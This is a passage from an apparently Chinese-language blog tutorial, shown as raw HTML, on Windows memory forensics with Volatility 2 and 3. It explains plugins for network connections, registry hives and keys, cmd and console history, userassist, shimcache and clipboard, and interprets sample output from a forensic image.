&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看当前网络链接：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; netscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714113947510&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714113947510.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714113947510.png&#34; alt=&#34;image-20250714113947510&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;LISTENING&lt;/code&gt;&lt;/strong&gt;：表示某个程序正在一个端口上“监听”，等待外部连接的建立&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ESTABLISHED&lt;/code&gt;&lt;/strong&gt;：表示一个 TCP 连接已经成功建立，双方正在进行数据通信&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;CLOSED&lt;/code&gt;/&lt;code&gt;TIME_WAIT&lt;/code&gt;/&lt;code&gt;SYN_SENT&lt;/code&gt;&lt;/strong&gt;：表示各种已关闭或正在建立/关闭过程中的连接状态&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;UDP 是无连接的协议，所以它没有 &lt;code&gt;State&lt;/code&gt;（状态）字段&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;我们可以从中筛选已经建立链接的项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; netscan | grep ESTABLISHED 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果当前系统中存在挖矿进程，网络连接列表又太长，就可以借此筛选，获取到矿池地址&lt;/p&gt;
&lt;p&gt;或者也可以根据提供的pid把它dump下来具体分析&lt;/p&gt;
&lt;h4 id=&#34;volatility3-17&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;更加建议使用NetStat，报告更赏心悦目：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.netstat.NetStat
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714114505605&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714114505605.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714114505605.png&#34; alt=&#34;image-20250714114505605&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当然，vol3也是有NetScan的：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.netscan.NetScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714113608063&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714113608063.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714113608063.png&#34; alt=&#34;image-20250714113608063&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h2 id=&#34;注册表分析&#34;&gt;注册表分析
&lt;/h2&gt;&lt;h3 id=&#34;查看注册表整体结构hivelist&#34;&gt;查看注册表整体结构（hivelist）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;hivelist&lt;/code&gt;的主要作用是为后续的&lt;code&gt;printkey&lt;/code&gt;等插件提供每个Hive的虚拟地址（第一列）&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-18&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; hivelist
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704132014554.png&#34; alt=&#34;image-20250704132014554&#34;  /&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ntuser.dat&lt;/code&gt;&lt;/strong&gt;：用户的注册表文件，这里表明Alissa Simpson和SmartNet是登录状态或近期登录过&lt;/p&gt;
&lt;h4 id=&#34;volatility3-18&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.registry.hivelist.HiveList
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714193939822&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714193939822.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714193939822.png&#34; alt=&#34;image-20250714193939822&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看具体注册表项printkey&#34;&gt;查看具体注册表项（printkey）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-19&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用逻辑路径：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; printkey -K &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;顶层路径\子路径&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;一定是从对应的hive开始，比如&lt;code&gt;SAM&lt;/code&gt;，&lt;code&gt;SECURITY&lt;/code&gt;等，而不是那五个根键：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714194449147&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714194449147.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714194449147.png&#34; alt=&#34;image-20250714194449147&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;也可以使用虚拟地址：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; printkey -o 虚拟地址
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714194807769.png&#34; alt=&#34;image-20250714194807769&#34; style=&#34;zoom:150%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;再根据结果返回的&lt;code&gt;SubKeys&lt;/code&gt;使用-K参数：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2  -f  &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; -o 虚拟地址 printkey -K &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;子键名称&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714194911155&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714194911155.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714194911155.png&#34; alt=&#34;image-20250714194911155&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;volatility3-19&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3只指定路径会去所有hive中寻找，需要使用逻辑路径＋虚拟地址才能精确定位：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.registry.printkey.PrintKey --offset 虚拟地址 --key &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;顶层路径\子路径&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714195649342&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714195649342.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714195649342.png&#34; alt=&#34;image-20250714195649342&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h2 id=&#34;用户活动与执行历史&#34;&gt;用户活动与执行历史
&lt;/h2&gt;&lt;h3 id=&#34;查看cmd历史命令cmdscan&#34;&gt;查看cmd历史命令（cmdscan）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;输出干净，有时能找到超出缓冲区范围的命令，即使已经清屏&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但没有命令的输出结果，且只限于cmd&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-20&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; cmdscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714200632869.png&#34; alt=&#34;image-20250714200632869&#34; style=&#34;zoom:150%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Application：DumpIt.exe&lt;/code&gt;&lt;/strong&gt;：Volatility在内存中定位到的这个命令历史记录区是属于&lt;code&gt;DumpIt.exe&lt;/code&gt;的&lt;/p&gt;
&lt;p&gt;这里cmdcount=0，说明没有发现cmd命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;DumpIt.exe&lt;/code&gt;是于快速创建物理内存完整转储的工具，也就是创建这个&amp;lt;内存镜像&amp;gt;用的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-20&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3对于win7等老系统可能不支持，分析会报错，使用时注意&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.cmdscan.CmdScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714203803483&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714203803483.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714203803483.png&#34; alt=&#34;image-20250714203803483&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.概览信息&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PID     Process     ConsoleInfo     Property                Address         Data
2084    conhost.exe 0x1445c89b900   _COMMAND_HISTORY        0x1445c89b900   None
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分告诉我们，在 PID 为&lt;code&gt;2084&lt;/code&gt;的&lt;code&gt;conhost.exe&lt;/code&gt;进程中，于内存地址&lt;code&gt;0x1445c89b900&lt;/code&gt;处，找到了一个&lt;code&gt;_COMMAND_HISTORY&lt;/code&gt;（命令历史）的数据结构&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.历史记录的元数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面几行带单个&lt;code&gt;*&lt;/code&gt;的是这个历史记录本身的属性：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;* 2084  conhost.exe ... _COMMAND_HISTORY.Application  ... cmd.exe
* 2084  conhost.exe ... _COMMAND_HISTORY.CommandCount ... 3
* 2084  conhost.exe ... _COMMAND_HISTORY.CommandCountMax ... 50
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Application：cmd.exe&lt;/code&gt;&lt;/strong&gt;：表明这个命令行窗口的应用程序是&lt;code&gt;cmd.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CommandCount：3&lt;/code&gt;&lt;/strong&gt;：它表示在这个命令历史缓冲区中，一共记录了3条命令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CommandCountMax：50&lt;/code&gt;&lt;/strong&gt;：表示这个缓冲区最多可以记录50条命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3.恢复出的命令内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面带两个星号&lt;code&gt;**&lt;/code&gt;的部分是用户输入过的命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;** 2084 conhost.exe ... CommandBucket_Command_0 ... ping easyforensics.com
** 2084 conhost.exe ... CommandBucket_Command_1 ... ipconfig
** 2084 conhost.exe ... CommandBucket_Command_2 ... ping easyforensics.com
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CommandBucket_Command_X&lt;/code&gt;&lt;/strong&gt;：代表历史记录缓冲区中的第 X 个槽位&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Data 列&lt;/strong&gt;：清晰地显示了用户按顺序输入的三条命令：
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ping easyforensics.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ipconfig&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ping easyforensics.com&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看控制台完整交互consoles&#34;&gt;查看控制台完整交互（consoles）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;consoles&lt;/code&gt;不仅能看到输入的命令，还能看到命令返回的输出结果，只要是conhost.exe控制的交互式窗口(cmd、poweshell等)就能提取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但它受缓冲区大小限制，只寻找当前屏幕缓冲区的内容，如果清屏了(&lt;code&gt;cls&lt;/code&gt;)就找不到了&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-21&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; consoles
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714202855628&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714202855628.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714202855628.png&#34; alt=&#34;image-20250714202855628&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;volatility3-21&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3对于win7等老系统可能不支持，分析会报错，使用时注意&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.consoles.Consoles
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250714201124616&#34; href=&#34;http://picture.928330.xyz/typora/image-20250714201124616.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714201124616.png&#34; alt=&#34;image-20250714201124616&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;此处显示未找到控制台信息&amp;quot;Console Information Not Found&amp;quot;&lt;/p&gt;
&lt;h3 id=&#34;查看gui程序执行记录userassist&#34;&gt;查看GUI程序执行记录（userassist）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;展示用户通过GUI启动的程序（点击快捷方式、开始菜单等）的信息，证明用户的主动操作行为&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它只记录explorer.exe，不接受cmd.exe/powershell.exe，不能看见用户通过命令行启动的程序&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-22&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; userassist
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704134021193.png&#34; alt=&#34;image-20250704134021193&#34; style=&#34;zoom: 50%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Registry：...\ntuser.dat&lt;/code&gt;&lt;/strong&gt;：个人注册表配置文件，用户为Alissa Simpson&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;REG_BINARY&lt;/code&gt;&lt;/strong&gt;：程序名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Count&lt;/code&gt;&lt;/strong&gt;：程序启动次数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Focus Count&lt;/code&gt;&lt;/strong&gt;：程序点击次数（焦点）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Last Update&lt;/code&gt;&lt;/strong&gt;：最后一次使用记录&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-22&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.registry.userassist.UserAssist
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250715113900449&#34; href=&#34;http://picture.928330.xyz/typora/image-20250715113900449.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715113900449.png&#34; alt=&#34;image-20250715113900449&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看程序准备记录shimcacheshimcachemem&#34;&gt;查看程序准备记录（shimcache/shimcachemem）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;记录任何准备执行的程序（包括后台服务、被浏览的文件等，不一定真的运行了）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它甚至能记录已被删除的程序的执行痕迹&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-23&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; shimcache
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250715124707154&#34; href=&#34;http://picture.928330.xyz/typora/image-20250715124707154.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715124707154.png&#34; alt=&#34;image-20250715124707154&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;volatility3-23&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.shimcachemem.ShimcacheMem
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250715124236951&#34; href=&#34;http://picture.928330.xyz/typora/image-20250715124236951.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715124236951.png&#34; alt=&#34;image-20250715124236951&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看剪贴板内容clipboard&#34;&gt;查看剪贴板内容（clipboard）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; clipboard
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;除了使用volatility2之外，也可以查看&lt;code&gt;ActivitiesCache.db&lt;/code&gt;数据库&lt;/strong&gt;&lt;/p&gt;
